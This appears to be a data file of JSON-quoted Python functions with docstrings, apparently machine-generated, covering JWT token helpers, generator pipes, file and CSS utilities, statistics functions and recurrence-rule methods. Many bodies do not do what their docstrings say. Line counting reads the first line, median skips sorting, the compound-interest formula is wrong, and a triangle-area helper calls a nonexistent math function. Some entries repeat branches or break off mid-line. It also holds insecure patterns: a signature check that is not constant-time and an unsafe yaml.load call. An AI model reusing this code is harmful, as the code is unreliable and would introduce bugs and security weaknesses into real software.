        "def compare_signatures(expected, actual):\n    \"\"\"Compares the given signatures.\n\n    :param expected: The expected signature.\n    :type expected: Union[str, bytes]\n    :param actual: The actual signature.\n    :type actual: Union[str, bytes]\n    :return: Do the signatures match?\n    :rtype: bool\n    \"\"\"\n    if expected is None or actual is None:\n        return False\n\n    if len(expected) != len(actual):\n        return False\n\n    for i, expected_byte in enumerate(expected):\n        actual_byte = actual[i]\n        if expected_byte != actual_byte:\n            return False\n\n    return True",
        "def _compare_tokens(expected, actual):\n    \"\"\"Compares the given tokens.\n\n    :param expected: The expected token.\n    :type expected: Union[str, bytes]\n    :param actual: The actual token.\n    :type actual: Union[str, bytes]\n    :return: Do the tokens match?\n    :rtype: bool\n    \"\"\"\n    if not isinstance(expected, bytes):\n        expected = expected.encode(\"utf-8\")\n    if not isinstance(actual, bytes):\n        actual = actual.encode(\"utf-8\")\n    return expected == actual",
        "def is_valid(self, time=None):\n        \"\"\"\n        Is the token valid? This method only checks the timestamps within the\n        token and compares them against the current time if none is provided.\n\n        :param time: The timestamp to validate against\n        :type time: Union[int, None]\n        :return: The validity of the token.\n        :rtype: bool\n        \"\"\"\n        if time is None:\n            time = time()\n        return self.timestamp <= time < self.timestamp + self.duration",
        "def _check_for_registered_claims(self, payload):\n        \"\"\"\n        Check for registered claims in the payload and move them to the\n        registered_claims property, overwriting any extant claims.\n        \"\"\"\n        for claim in payload:\n            if claim.startswith(self.claims_prefix):\n                self.registered_claims.append(claim)",
        "def create_token(self):\n        \"\"\"Create a token based on the data held in the class.\n\n        :return: A new token\n        :rtype: str\n        \"\"\"\n        if self.token_type == self.TOKEN_TYPE_NONE:\n            return None\n        elif self.token_type == self.TOKEN_TYPE_HMAC:\n            return self.create_hmac_token()\n        elif self.token_type == self.TOKEN_TYPE_HMAC_SHA1:\n            return self.create_hmac_sha1_token()\n        elif self.token_type == self.TOKEN_TYPE_HMAC_SHA256:\n            return self.create_hmac_sha256_token()\n        elif self.token_type == self.TOKEN_TYPE_HMAC_SHA384:\n            return self.create_hmac_sha384_token()\n        elif self.token",
        "def decode(cls, secret, token, alg):\n        \"\"\"\n        Decodes the given token into an instance of `Jwt`.\n\n        :param secret: The secret used to decode the token. Must match the\n            secret used when creating the token.\n        :type secret: Union[str, bytes]\n        :param token: The token to decode.\n        :type token: Union[str, bytes]\n        :param alg: The algorithm used to decode the token. Must match the\n            algorithm used when creating the token.\n        :type alg: str\n        :return: The decoded token.\n        :rtype: `Jwt`\n        \"\"\"\n        if not isinstance(secret, bytes):\n            raise ValueError('secret must be bytes')\n        if not isinstance(token, bytes):\n            raise ValueError('token must be bytes')\n        if not alg:\n            raise ValueError('alg must be",
        "def _compare(self, jwt, compare_dates=True):\n        \"\"\"\n        Compare against another `Jwt`.\n\n        :param jwt: The token to compare against.\n        :type jwt: Jwt\n        :param compare_dates: Should the comparision take dates into account?\n        :type compare_dates: bool\n        :return: Are the two Jwt's the same?\n        :rtype: bool\n        \"\"\"\n        if compare_dates:\n            return self._compare_dates(jwt)\n        return self._compare_basic(jwt)",
        "def download(self, url, filename):\n        \"\"\"Download a file.\"\"\"\n        self.logger.info(\"Downloading %s\", url)\n        response = requests.get(url, stream=True)\n        with open(filename, 'wb') as f:\n            for chunk in response.iter_content(chunk_size=1024):\n                if chunk:\n                    f.write(chunk)",
        "def is_json_file(path):\n    \"\"\"Test a file is a valid json file.\n\n    - *.json: uncompressed, utf-8 encode json file\n    - *.js: uncompressed, utf-8 encode json file\n    - *.gz: compressed, utf-8 encode json file\n    \"\"\"\n    if path.endswith('.json'):\n        return True\n    if path.endswith('.js'):\n        return True\n    if path.endswith('.gz'):\n        return True\n    return False",
        "def set_dumper(self, obj):\n        \"\"\"``set`` dumper.\"\"\"\n        return self.dumper(obj, self.set_serializer)",
        "def deque_dumper(obj, indent=0, **kwargs):\n    \"\"\"``collections.deque`` dumper.\"\"\"\n    return _deque_dumper(obj, indent, **kwargs).__repr__()",
        "def OrderedDictDumper(obj, indent=0, **kwargs):\n    \"\"\"``collections.OrderedDict`` dumper.\"\"\"\n    return _OrderedDictDumper(obj, indent, **kwargs).dump()",
        "def _dump_numpy_ndarray(obj, indent, level):\n    \"\"\"``numpy.ndarray`` dumper.\n    \"\"\"\n    if isinstance(obj, np.ndarray):\n        return _dump_ndarray(obj, indent, level)\n    elif isinstance(obj, np.ndarray):\n        return _dump_ndarray(obj, indent, level)\n    elif isinstance(obj, np.ndarray):\n        return _dump_ndarray(obj, indent, level)\n    elif isinstance(obj, np.ndarray):\n        return _dump_ndarray(obj, indent, level)\n    elif isinstance(obj, np.ndarray):\n        return _dump_ndarray(obj, indent, level)\n    elif isinstance(obj, np.ndarray):\n        return _dump_ndarray(obj, indent, level)\n    elif isinstance(obj, np.ndarray):\n        return _dump_ndarray(obj,",
        "def invalidate_length(func):\n    \"\"\"Decorator for rruleset methods which may invalidate the\n    cached length.\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        if not args:\n            return func(*kwargs)\n        if len(args) > 1:\n            raise ValueError(\"rruleset method takes exactly one argument\")\n        if len(args) == 1:\n            return func(*args[0])\n        return func(*args[0:1])\n    return wrapper",
        "def get_recurrence(self, dt, inc=False):\n        \"\"\" Returns the last recurrence before the given datetime instance. The\n            inc keyword defines what happens if dt is an occurrence. With\n            inc=True, if dt itself is an occurrence, it will be returned.\n        \"\"\"\n        if inc:\n            return self.get_recurrence_inc(dt)\n        else:\n            return self.get_recurrence_prev(dt)",
        "def next(self, dt, inc=False):\n        \"\"\" Returns the first recurrence after the given datetime instance. The\n            inc keyword defines what happens if dt is an occurrence. With\n            inc=True, if dt itself is an occurrence, it will be returned.\n        \"\"\"\n        if inc:\n            return self.find_one({'inc': True})\n        else:\n            return self.find_one({'inc': False})",
        "def after_dt(self, dt, count=None, inc=False):\n        \"\"\"\n        Generator which yields up to `count` recurrences after the given\n        datetime instance, equivalent to `after`.\n\n        :param dt:\n            The datetime at which to start generating recurrences.\n\n        :param count:\n            The maximum number of recurrences to generate. If `None` (default),\n            dates are generated until the recurrence rule is exhausted.\n\n        :param inc:\n            If `dt` is an instance of the rule and `inc` is `True`, it is\n            included in the output.\n\n        :yields: Yields a sequence of `datetime` objects.\n        \"\"\"\n        if inc:\n            yield dt\n        else:\n            for i in range(count):\n                yield dt + self.interval\n                if i == count:\n                    break",
        "def copy(self, **kwargs):\n        \"\"\"Return new rrule with same attributes except for those attributes given new\n           values by whichever keyword arguments are specified.\n        \"\"\"\n        new_rrule = Rrule(self.name, self.src, self.dst, self.ttl,\n                          self.protocol, self.src_port, self.dst_port,\n                          self.ttl_seconds, self.protocol_port,\n                          self.src_port_range, self.dst_port_range,\n                          self.src_port_range, self.dst_port_range,\n                          self.src_port_range, self.dst_port_range,\n                          self.src_port_range, self.dst_port_range,\n                          self.src_port_range, self.dst_port_range,\n                          self.src_port_range,",
        "def main():\n    \"\"\"\n    Run the excel_to_html function from the\n    command-line.\n\n    Args:\n        -p path to file\n        -s name of the sheet to convert\n        -css classes to apply\n        -m attempt to combine merged cells\n        -c caption for accessibility\n        -su summary for accessibility\n        -d details for accessibility\n\n    Example use:\n\n        excel_to_html -p myfile.xlsx -s SheetName -css diablo-python -m true\n    \"\"\"\n    args = docopt(__doc__)\n    if args['-p']:\n        path = args['-p']\n    else:\n        path = sys.stdin.readline().strip()\n    if args['-s']:\n        sheet = args['-s']\n    else:\n        sheet = sys.",
        "def get_template(self, language, template_type, indentation, key, val):\n        \"\"\"Gets the requested template for the given language.\n\n        Args:\n            language: string, the language of the template to look for.\n\n            template_type: string, 'iterable' or 'singular'. \n            An iterable template is needed when the value is an iterable\n            and needs more unpacking, e.g. list, tuple. A singular template \n            is needed when unpacking is complete and the value is singular, \n            e.g. string, int, float.\n\n            indentation: int, the indentation level.\n    \n            key: multiple types, the array key.\n\n            val: multiple types, the array values\n\n        Returns:\n            string, template formatting for arrays by language.\n        \"\"\"\n        if template_type == 'iterable':\n            return self.get_iterable",
        "def print_array(self, string, language, level=3, retdata=False):\n        \"\"\"\n        Unserializes a serialized php array and prints it to\n        the console as a data structure in the specified language.\n        Used to translate or convert a php array into a data structure \n        in another language. Currently supports, PHP, Python, Javascript,\n        and JSON. \n\n        Args:\n            string: a string of serialized php\n        \n            language: a string representing the desired output \n            format for the array.\n\n            level: integer, indentation level in spaces. \n            Defaults to 3.\n\n            retdata: boolean, the method will return the string\n            in addition to printing it if set to True. Defaults \n            to false.\n\n        Returns:\n            None but prints a string to the console if retdata is \n            False, otherwise returns a string.\n        \"\"\"\n",
        "def load_config():\n    \"\"\"Only API function for the config module.\n\n    :return: {dict}     loaded validated configuration.\n    \"\"\"\n    config_path = os.path.join(os.path.dirname(__file__), 'config.yaml')\n    with open(config_path, 'r') as f:\n        config = yaml.load(f)\n    return config",
        "def reusable_generator(func):\n    \"\"\"Create a reusable class from a generator function\n\n    Parameters\n    ----------\n    func: GeneratorCallable[T_yield, T_send, T_return]\n        the function to wrap\n\n    Note\n    ----\n    * the callable must have an inspectable signature\n    * If bound to a class, the new reusable generator is callable as a method.\n      To opt out of this, add a :func:`staticmethod` decorator above\n      this decorator.\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        \"\"\"The wrapper function\"\"\"\n        if not inspect.isgeneratorfunction(func):\n            raise TypeError(\"The generator function must be a generator function\")\n        if not inspect.ismethod(func):\n            raise TypeError(\"The generator function must be a method\")\n        if not inspect.is",
        "def send_gen_value(gen, value):\n    \"\"\"Send an item into a generator expecting a final return value\n\n    Parameters\n    ----------\n    gen: ~typing.Generator[T_yield, T_send, T_return]\n        the generator to send the value to\n    value: T_send\n        the value to send\n\n    Raises\n    ------\n    RuntimeError\n        if the generator did not return as expected\n\n    Returns\n    -------\n    T_return\n        the generator's return value\n    \"\"\"\n    try:\n        return next(gen)\n    except StopIteration:\n        raise RuntimeError(\"Generator did not return as expected\")",
        "def map_all(func, gen):\n    \"\"\"Apply a function to all ``send`` values of a generator\n\n    Parameters\n    ----------\n    func: ~typing.Callable[[T_send], T_mapped]\n        the function to apply\n    gen: Generable[T_yield, T_mapped, T_return]\n        the generator iterable.\n\n    Returns\n    -------\n    ~typing.Generator[T_yield, T_send, T_return]\n        the mapped generator\n    \"\"\"\n    for send in gen:\n        yield func(send)",
        "def ipdb_exception(exc_type, exc_value, exc_trace):\n    \"\"\"Prints the traceback and invokes the ipython debugger on any exception\n\n    Only invokes ipydb if you are outside ipython or python interactive session.\n    So scripts must be called from OS shell in order for exceptions to ipy-shell-out.\n\n    Dependencies:\n      Needs `pip install ipdb`\n\n    Arguments:\n      exc_type (type): The exception type/class (e.g. RuntimeError)\n      exc_value (Exception): The exception instance (e.g. the error message passed to the Exception constructor)\n      exc_trace (Traceback): The traceback instance\n    \n    References:\n      http://stackoverflow.com/a/242531/623735\n\n    Example Usage:\n      $  python -c 'from pug import debug;x=",
        "def copy_file(file_path, target_path):\n    \"\"\"Copies a file from its location on the web to a designated \n    place on the local machine.\n\n    Args:\n        file_path: Complete url of the file to copy, string (e.g. http://fool.com/input.css).\n\n        target_path: Path and name of file on the local machine, string. (e.g. /directory/output.css)\n\n    Returns:\n        None.\n    \"\"\"\n    print(\"Copying file: %s to %s\" % (file_path, target_path))\n    try:\n        shutil.copy(file_path, target_path)\n    except Exception as e:\n        print(\"Error copying file: %s\" % e)",
        "def count_lines(fname):\n    \"\"\"Counts the number of lines in a file.\n\n    Args:\n        fname: string, name of the file.\n\n    Returns:\n        integer, the number of lines in the file.\n    \"\"\"\n    with open(fname, 'r') as f:\n        return int(f.readline())",
        "def indent_css(f, output):\n    \"\"\"Indentes css that has not been indented and saves it to a new file.\n    A new file is created if the output destination does not already exist.\n\n    Args:\n        f: string, path to file.\n\n        output: string, path/name of the output file (e.g. /directory/output.css).\n    print type(response.read())\n\n    Returns:\n        None.\n    \"\"\"\n    with open(output, 'w') as f:\n        f.write(indent(f.read()))",
        "def line_breaks(f, output):\n    \"\"\"Adds line breaks after every occurance of a given character in a file.\n\n    Args:\n        f: string, path to input file.\n\n        output: string, path to output file.\n\n    Returns:\n        None.\n    \"\"\"\n    with open(f, 'r') as f:\n        for line in f:\n            if line.startswith('#'):\n                continue\n            output.write(line + '\\n')",
        "def reformat_css(input_file, output_file):\n    \"\"\"\n    Reformats poorly written css. This function does not validate or fix errors in the code.\n    It only gives code the proper indentation. \n\n    Args:\n        input_file: string, path to the input file.\n\n        output_file: string, path to where the reformatted css should be saved. If the target file\n        doesn't exist, a new file is created.\n\n    Returns:\n        None.\n    \"\"\"\n    with open(input_file, 'r') as f:\n        css = f.read()\n\n    with open(output_file, 'w') as f:\n        f.write(css.replace('\\n', '\\n\\n'))",
        "def clean_whitespace(iterable):\n    \"\"\"\n    Take a list of strings and clear whitespace \n    on each one. If a value in the list is not a \n    string pass it through untouched.\n\n    Args:\n        iterable: mixed list\n\n    Returns: \n        mixed list\n    \"\"\"\n    if not isinstance(iterable, list):\n        iterable = [iterable]\n    return [x.strip() for x in iterable]",
        "def get_future_value_for_annual_rate(present_value, annual_rate, periods_per_year, years):\n    \"\"\"\n    Calculates the future value of money invested at an anual interest rate,\n    x times per year, for a given number of years.\n\n    Args:\n        present_value: int or float, the current value of the money (principal).\n\n        annual_rate: float 0 to 1 e.g., .5 = 50%), the interest rate paid out.\n\n        periods_per_year: int, the number of times money is invested per year.\n\n        years: int, the number of years invested.\n\n    Returns:\n        Float, the future value of the money invested with compound interest.\n    \"\"\"\n    return present_value + annual_rate * (periods_per_year * years)",
        "def triangle_area(point1, point2, point3):\n    \"\"\"\n    Uses Heron's formula to find the area of a triangle\n    based on the coordinates of three points.\n\n    Args:\n        point1: list or tuple, the x y coordinate of point one.\n\n        point2: list or tuple, the x y coordinate of point two.\n\n        point3: list or tuple, the x y coordinate of point three.\n\n    Returns:\n        The area of a triangle as a floating point number.\n\n    Requires:\n        The math module, point_distance().\n    \"\"\"\n    return math.point_distance(point1, point2, point3)",
        "def median(data):\n    \"\"\"\n    Calculates  the median of a list of integers or floating point numbers.\n\n    Args:\n        data: A list of integers or floating point numbers\n\n    Returns:\n        Sorts the list numerically and returns the middle number if the list has an odd number\n        of items. If the list contains an even number of items the mean of the two middle numbers\n        is returned.\n    \"\"\"\n    if len(data) % 2 == 1:\n        return data[len(data) // 2]\n    else:\n        return np.mean(data)",
        "def average_or_mean(numbers, numtype='decimal'):\n    \"\"\"Calculates the average or mean of a list of numbers\n\n    Args:\n        numbers: a list of integers or floating point numbers.\n\n        numtype: string, 'decimal' or 'float'; the type of number to return.\n\n    Returns:\n        The average (mean) of the numbers as a floating point number\n        or a Decimal object.\n\n    Requires:\n        The math module\n    \"\"\"\n    if numtype == 'decimal':\n        return math.average(numbers)\n    elif numtype == 'float':\n        return math.mean(numbers)\n    else:\n        raise ValueError('Invalid type for average or mean')",
        "def variance(numbers, type='population'):\n    \"\"\"\n    Calculates the population or sample variance of a list of numbers.\n    A large number means the results are all over the place, while a\n    small number means the results are comparatively close to the average.\n\n    Args:\n        numbers: a list  of integers or floating point numbers to compare.\n\n        type: string, 'population' or 'sample', the kind of variance to be computed.\n\n    Returns:\n        The computed population or sample variance.\n        Defaults to population variance.\n\n    Requires:\n        The math module, average()\n    \"\"\"\n    if type == 'population':\n        return math.average(numbers)\n    elif type == 'sample':\n        return math.average(numbers) / len(numbers)",
        "def find_percentage(a, b, i=False, r=False):\n    \"\"\"Finds the percentage of one number over another.\n\n    Args:\n        a: The number that is a percent, int or float.\n\n        b: The base number that a is a percent of, int or float.\n\n        i: Optional boolean integer. True if the user wants the result returned as\n        a whole number. Assumes False.\n\n        r: Optional boolean round. True if the user wants the result rounded.\n        Rounds to the second decimal point on floating point numbers. Assumes False.\n\n    Returns:\n        The argument a as a percentage of b. Throws a warning if integer is set to True\n        and round is set to False.\n    \"\"\"\n    if i:\n        return a * 100 / b\n    elif r:\n        return a / b * 100",
        "def get_datetime_string(self, datetime_obj):\n        \"\"\"Get datetime string from datetime object\n\n        :param datetime datetime_obj: datetime object\n        :return: datetime string\n        :rtype: str\n        \"\"\"\n        if datetime_obj is None:\n            return None\n        return datetime_obj.strftime(self.DATETIME_FORMAT)",
        "def attr_pipe(prev, attr_name):\n    \"\"\"attr pipe can extract attribute value of object.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param attr_name: The name of attribute\n    :type attr_name: str\n    :returns: generator\n    \"\"\"\n    for item in prev:\n        if hasattr(item, attr_name):\n            yield getattr(item, attr_name)",
        "def attrs(prev, attr_names):\n    \"\"\"attrs pipe can extract attribute values of object.\n\n    If attr_names is a list and its item is not a valid attribute of\n    prev's object. It will be excluded from yielded dict.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param attr_names: The list of attribute names\n    :type attr_names: str of list\n    :returns: generator\n    \"\"\"\n    for attr_name in attr_names:\n        if attr_name not in prev.obj:\n            yield dict(prev.obj)",
        "def attrdict(prev, attr_names):\n    \"\"\"attrdict pipe can extract attribute values of object into a dict.\n\n    The argument attr_names can be a list or a dict.\n\n    If attr_names is a list and its item is not a valid attribute of\n    prev's object. It will be excluded from yielded dict.\n\n    If attr_names is dict and the key doesn't exist in prev's object.\n    the value of corresponding attr_names key will be copy to yielded dict.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param attr_names: The list or dict of attribute names\n    :type attr_names: str of list or dict\n    :returns: generator\n    \"\"\"\n    if isinstance(attr_names, (list, tuple)):\n        for attr_name in attr_names:\n            if",
        "def flatten(prev, depth=0):\n    \"\"\"flatten pipe extracts nested item from previous pipe.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param depth: The deepest nested level to be extracted. 0 means no extraction.\n    :type depth: integer\n    :returns: generator\n    \"\"\"\n    for item in prev:\n        if depth > 0:\n            yield item\n        else:\n            yield item",
        "def values(prev):\n    \"\"\"values pipe extract value from previous pipe.\n\n    If previous pipe send a dictionary to values pipe, keys should contains\n    the key of dictionary which you want to get. If previous pipe send list or\n    tuple,\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :returns: generator\n    \"\"\"\n    while True:\n        try:\n            item = next(prev)\n        except StopIteration:\n            return\n        if isinstance(item, dict):\n            yield item\n        elif isinstance(item, (list, tuple)):\n            yield item[0]",
        "def pack(prev, rest=False, padding=None):\n    \"\"\"pack pipe takes n elements from previous generator and yield one\n    list to next.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param rest: Set True to allow to output the rest part of last elements.\n    :type prev: boolean\n    :param padding: Specify the padding element for the rest part of last elements.\n    :type prev: boolean\n    :returns: generator\n\n    :Example:\n    >>> result([1,2,3,4,5,6,7] | pack(3))\n    [[1, 2, 3], [4, 5, 6]]\n\n    >>> result([1,2,3,4,5,6,7] | pack(3, rest=True))\n    [[1, 2, 3], [4, 5",
        "def pipe_grep(prev, pattern, inv=False, **kw):\n    \"\"\"The pipe greps the data passed from previous generator according to\n    given regular expression.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The pattern which used to filter out data.\n    :type pattern: str|unicode|re pattern object\n    :param inv: If true, invert the match condition.\n    :type inv: boolean\n    :param kw:\n    :type kw: dict\n    :returns: generator\n    \"\"\"\n    if inv:\n        pattern = re.compile(pattern)\n    return pipe_filter(prev, pattern, **kw)",
        "def match(prev, pattern, to=None):\n    \"\"\"The pipe greps the data passed from previous generator according to\n    given regular expression. The data passed to next pipe is MatchObject\n    , dict or tuple which determined by 'to' in keyword argument.\n\n    By default, match pipe yields MatchObject. Use 'to' in keyword argument\n    to change the type of match result.\n\n    If 'to' is dict, yield MatchObject.groupdict().\n    If 'to' is tuple, yield MatchObject.groups().\n    If 'to' is list, yield list(MatchObject.groups()).\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The pattern which used to filter data.\n    :type pattern: str|unicode\n    :param to: What data type the result should be stored. dict|tuple|",
        "def resplit(prev, pattern, **kwargs):\n    \"\"\"The resplit pipe split previous pipe input by regular expression.\n\n    Use 'maxsplit' keyword argument to limit the number of split.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The pattern which used to split string.\n    :type pattern: str|unicode\n    \"\"\"\n    maxsplit = kwargs.get('maxsplit', None)\n    if maxsplit is not None:\n        return Pipe(prev, maxsplit=maxsplit, **kwargs)\n    return Pipe(prev, **kwargs)",
        "def sub(prev, pattern, repl=None):\n    \"\"\"sub pipe is a wrapper of re.sub method.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The pattern string.\n    :type pattern: str|unicode\n    :param repl: Check repl argument in re.sub method.\n    :type repl: str|unicode|callable\n    \"\"\"\n    return re.sub(pattern, repl, prev)",
        "def pipe_grep(prev, pattern, inv=False):\n    \"\"\"wildcard pipe greps data passed from previous generator\n    according to given regular expression.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The wildcard string which used to filter data.\n    :type pattern: str|unicode|re pattern object\n    :param inv: If true, invert the match condition.\n    :type inv: boolean\n    :returns: generator\n    \"\"\"\n    if inv:\n        pattern = re.compile(r'^(?:' + pattern + r'|[^\\\\])*')\n    else:\n        pattern = re.compile(pattern)\n    return (item for item in prev if pattern.match(item))",
        "def pipe_write(prev, endl='\\n', thru=False):\n    \"\"\"This pipe read data from previous iterator and write it to stdout.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param endl: The end-of-line symbol for each output.\n    :type endl: str\n    :param thru: If true, data will passed to next generator. If false, data\n                 will be dropped.\n    :type thru: bool\n    :returns: generator\n    \"\"\"\n    while True:\n        data = prev.read()\n        if not data:\n            break\n        if thru:\n            yield data\n        else:\n            print(data, end=endl)",
        "def pipe_read(prev, filename=None, mode='r', trim=None, start=None, end=None):\n    \"\"\"This pipe get filenames or file object from previous pipe and read the\n    content of file. Then, send the content of file line by line to next pipe.\n\n    The start and end parameters are used to limit the range of reading from file.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param filename: The files to be read. If None, use previous pipe input as filenames.\n    :type filename: None|str|unicode|list|tuple\n    :param mode: The mode to open file. default is 'r'\n    :type mode: str\n    :param trim: The function to trim the line before send to next pipe.\n    :type trim: function object.\n    :param start: if star",
        "def sh(*args, **kw):\n    \"\"\"\n    sh pipe execute shell command specified by args. If previous pipe exists,\n    read data from it and write it to stdin of shell process. The stdout of\n    shell process will be passed to next pipe object line by line.\n\n    A optional keyword argument 'trim' can pass a function into sh pipe. It is\n    used to trim the output from shell process. The default trim function is\n    str.rstrip. Therefore, any space characters in tail of\n    shell process output line will be removed.\n\n    For example:\n\n    py_files = result(sh('ls') | strip | wildcard('*.py'))\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param args: The command line arguments. It will be joined by space character.\n    :type args: list of string.\n",
        "def pipe_walk(prev, *args, **kw):\n    \"\"\"This pipe wrap os.walk and yield absolute path one by one.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param args: The end-of-line symbol for each output.\n    :type args: list of string.\n    :param kw: The end-of-line symbol for each output.\n    :type kw: dictionary of options. Add 'endl' in kw to specify end-of-line symbol.\n    :returns: generator\n    \"\"\"\n    for root, dirs, files in os.walk(prev.path, topdown=True, **kw):\n        for d in dirs:\n            yield os.path.join(root, d)\n        for f in files:\n            yield os.path.join(root, f)",
        "def str_join(self, *args):\n        \"\"\"alias of str.join\"\"\"\n        return self.join(args, self.separator)",
        "def substitute(self, *args, **kwargs):\n        \"\"\"alias of string.Template.substitute\"\"\"\n        return self.string.substitute(*args, **kwargs)",
        "def safe_substitute(self, *args, **kwargs):\n        \"\"\"alias of string.Template.safe_substitute\"\"\"\n        return self.template.safe_substitute(*args, **kwargs)",
        "def _convert_data(self, data):\n        \"\"\"Convert data from previous pipe with specified encoding.\"\"\"\n        if isinstance(data, bytes):\n            data = data.decode(self.encoding)\n        return data",
        "def register_default_convertors():\n    \"\"\"Regiser all default type-to-pipe convertors.\"\"\"\n    for converter in _DEFAULT_CONVERTERS:\n        converter.register_default_converter()\n        converter.register_default_converter_for_type(\n            type(None),\n            lambda x: x,\n        )",
        "def to_dict(self):\n        \"\"\"Convert Paginator instance to dict\n\n        :return: Paging data\n        :rtype: dict\n        \"\"\"\n        data = {\n            'page': self.page,\n            'page_size': self.page_size,\n            'first': self.first,\n            'last': self.last,\n            'next': self.next,\n            'previous': self.previous,\n            'first_page': self.first_page,\n            'last_page': self.last_page,\n            'first_item': self.first_item,\n            'last_item': self.last_item,\n            'next_page': self.next_page,\n            'previous_page': self.previous_page,\n            'first_page_number': self.first_page_number,\n            'last_page",
        "def _check_pidfile_exists(pidfile_path):\n    \"\"\"Check that a process is not running more than once, using PIDFILE\"\"\"\n    if os.path.exists(pidfile_path):\n        pid = os.getpid()\n        if pid != os.getpid():\n            raise RuntimeError('PIDFILE exists, but PID is %s' % pid)",
        "def is_pid_running(pid):\n    \"\"\"This function will check whether a PID is currently running\"\"\"\n    try:\n        os.kill(pid, 0)\n        return True\n    except OSError:\n        return False",
        "def stop(self):\n        \"\"\"This function will disown, so the Ardexa service can be restarted\"\"\"\n        self.logger.info(\"Stopping Ardexa service...\")\n        self.stop_service()\n        self.logger.info(\"Ardexa service stopped.\")",
        "def check_call(program, shell=False):\n    \"\"\"\n    Run a  program and check program return code Note that some commands don't work\n    well with Popen.  So if this function is specifically called with 'shell=True',\n    then it will run the old 'os.system'. In which case, there is no program output\n    \"\"\"\n    if shell:\n        return os.system(program)\n    else:\n        return subprocess.call(program)",
        "def parse_address_list(address_list):\n    \"\"\"\n    Yield each integer from a complex range string like \"1-9,12,15-20,23\"\n\n    >>> list(parse_address_list('1-9,12,15-20,23'))\n    [1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 15, 16, 17, 18, 19, 20, 23]\n\n    >>> list(parse_address_list('1-9,12,15-20,2-3-4'))\n    Traceback (most recent call last):\n        ...\n    ValueError: format error in 2-3-4\n    \"\"\"\n    if not address_list:\n        return\n\n    if not address_list.startswith('-'):\n        raise ValueError('address_list must start with -')\n\n    if not",
        "def _encode_resource_ids(self, resource_ids):\n        \"\"\"Do url-encode resource ids\"\"\"\n        if not isinstance(resource_ids, list):\n            raise TypeError(\"resource_ids must be a list\")\n        return [self._encode_resource_id(id) for id in resource_ids]",
        "def get_item_creator(item_type):\n    \"\"\"Get item creator according registered item type.\n\n    :param item_type: The type of item to be checed.\n    :type item_type: types.TypeType.\n    :returns: Creator function. None if type not found.\n    \"\"\"\n    if item_type not in _item_creators:\n        return None\n    return _item_creators[item_type]",
        "def clone(self):\n        \"\"\"\n        Self-cloning. All its next Pipe objects are cloned too.\n\n        :returns: cloned object\n        \"\"\"\n        return Pipe(self.name, self.pipe_type, self.pipe_id, self.pipe_args,\n                   self.pipe_kwargs, self.pipe_data)",
        "def append(self, next):\n        \"\"\"Append next object to pipe tail.\n\n        :param next: The Pipe object to be appended to tail.\n        :type next: Pipe object.\n        \"\"\"\n        if next.is_empty():\n            return\n        self._tail.append(next)\n        if next.is_empty():\n            self._tail = None",
        "def iter(self, prev=None):\n        \"\"\"Return an generator as iterator object.\n\n        :param prev: Previous Pipe object which used for data input.\n        :returns: A generator for iteration.\n        \"\"\"\n        if prev is None:\n            prev = self\n        return iter(prev.data)",
        "def reduce(self, func, *args, **kw):\n        \"\"\"Wrap a reduce function to Pipe object. Reduce function is a function\n        with at least two arguments. It works like built-in reduce function.\n        It takes first argument for accumulated result, second argument for\n        the new data to process. A keyword-based argument named 'init' is\n        optional. If init is provided, it is used for the initial value of\n        accumulated result. Or, the initial value is None.\n\n        The first argument is the data to be converted. The return data from\n        filter function should be a boolean value. If true, data can pass.\n        Otherwise, data is omitted.\n\n        :param func: The filter function to be wrapped.\n        :type func: function object\n        :param args: The default arguments to be used for filter function.\n        :param kw: The default keyword arguments to",
        "def _get_net_active_status(net_list):\n    '''\n    Return a dictionary of network name to active status bools.\n\n        Sample virsh net-list output::\n\n    Name                 State      Autostart\n    -----------------------------------------\n    default              active     yes\n    juju-test            inactive   no\n    foobar               inactive   no\n\n    Parsing the above would return::\n    {\"default\": True, \"juju-test\": False, \"foobar\": False}\n\n    See: http://goo.gl/kXwfC\n    '''\n    net_active_status = {}\n    for net in net_list:\n        net_active_status[net['name']] = net['active']\n    return net_active_status",
        "def flush(self):\n        \"\"\"flush the line to stdout\"\"\"\n        if self.is_buffered:\n            self.stdout.write(self.line)\n            self.line = ''\n        else:\n            self.stdout.write(self.line)\n            self.line = ''",
        "def run(self, *args):\n        \"\"\"\n        runs the passed in arguments and returns an iterator on the output of\n        running command\n        \"\"\"\n        if self.args:\n            args = list(args)\n            args.insert(0, self.args[0])\n        return self.run_command(*args)",
        "def build_basic_035_subfield(root):\n    \"\"\"\n    Build a basic 035 subfield with basic information from the OAI-PMH request.\n\n    :param root: ElementTree root node\n\n    :return: list of subfield tuples [(..),(..)]\n    \"\"\"\n    basic_035_subfield = []\n    for child in root:\n        if child.tag == 'basic-035':\n            basic_035_subfield.append((child.text, child.text))\n    return basic_035_subfield",
        "def strip_namespace(root):\n    \"\"\"\n    Strip out namespace data from an ElementTree.\n\n    This function is recursive and will traverse all\n    subnodes to the root element\n\n    @param root: the root element\n\n    @return: the same root element, minus namespace\n    \"\"\"\n    if root.tag == 'nsmap':\n        return root\n    for child in root:\n        if child.tag == 'nsmap':\n            return strip_namespace(child)\n    return root",
